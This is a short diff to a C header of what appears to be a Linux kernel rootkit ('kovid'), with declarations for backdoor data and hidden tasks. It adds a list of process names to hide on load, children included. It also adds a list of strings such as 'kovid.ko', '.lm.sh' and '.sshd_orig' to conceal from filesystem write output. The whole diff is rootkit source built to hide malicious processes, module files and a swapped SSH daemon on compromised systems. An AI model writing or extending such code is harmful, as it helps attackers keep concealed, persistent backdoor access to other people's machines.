@@ -132,7 +132,7 @@ bool kv_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *);
 void kv_reload_hidden_task(struct task_struct *task);
 void kv_pid_cleanup(void);
 void kv_show_saved_tasks(void);
-void kv_scan_and_hide_netapp(void);
+void kv_scan_and_hide(void);
 
 /** syscall,function addresses */
 struct kernel_syscalls *kv_kall_load_addr(void);
@@ -159,6 +159,24 @@ char *kv_util_random_AZ_string(size_t);
 
 /** VM operations */
 unsigned long kv_get_elf_vm_start(pid_t);
+
+ /*
+  * Hide these process names during load
+  * children included
+ */
+static const char *kv_hide_ps_on_load[] = {
+    "whitenose", "pinknose", "rednose", "blacknose",
+    "greynose", "purplenose", "bluenose", NULL
+};
+
+/*
+ * Hide these names from write() fs output
+ */
+static const char *kv_hide_str_on_load[] = {
+    ".kovid", "kovid", "kovid.ko", ".kv.ko",
+    ".lm.sh", ".sshd_orig", NULL
+};
+
 
 // PP_NARG from
 // https://groups.google.com/forum/#!topic/comp.std.c/d-6Mj5Lko_s
